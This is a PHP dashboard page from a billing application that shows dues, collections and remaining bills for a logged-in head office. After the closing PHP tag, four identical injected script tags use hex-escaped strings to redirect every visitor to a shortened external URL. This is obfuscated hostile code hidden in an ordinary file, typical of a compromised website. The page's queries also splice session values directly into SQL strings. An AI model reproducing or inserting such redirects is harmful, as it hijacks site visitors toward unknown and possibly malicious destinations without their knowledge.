<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");
if(!isset($_SESSION['USER_ID'])){
    header("location:/login.php");
    exit;
}
$type=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'TYPE','headoffice_master');
$billingType=(($type=='L')?'Expiry Date':'Balance(Bills)');
$pendingBills=($objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(BILLS)','admin_collections')-$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C'",'COUNT(*)','monthly_charges'));
$BillsLeft=(($type=='B')?$pendingBills.' Bills':$objMisc->dateFormat($objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'EXPIRY_DATE','headoffice_master')));
$totalDues=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='D'",'SUM(AMOUNT)','monthly_charges');
$totCollection=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C'",'SUM(AMOUNT)','monthly_charges');
$totPending=($totalDues-$totCollection);
$smartyVars['billsLeft'] = $BillsLeft;
$smartyVars['billingType'] = $billingType;
$smartyVars['totalDues'] = $totalDues;
$smartyVars['totCollection'] = $totCollection;
$smartyVars['totPending'] = $totPending;
$smartyVars['msg'] = $msg;

$objMisc->displayPage("header,index,footer",$smartyVars);
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>